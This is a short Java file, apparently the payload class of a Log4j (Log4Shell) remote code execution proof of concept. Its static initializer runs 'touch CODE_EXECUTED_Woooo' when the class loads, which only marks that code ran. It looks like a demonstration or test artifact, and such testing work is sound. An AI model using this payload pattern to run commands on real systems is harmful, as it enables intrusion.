public class Log4jRCE {

    static {
       try {
           String[] cmd = {"touch", "CODE_EXECUTED_Woooo"};
           java.lang.Runtime.getRuntime().exec(cmd).waitFor();
       } catch (Exception e) {
           e.printStackTrace();
       }
    }

}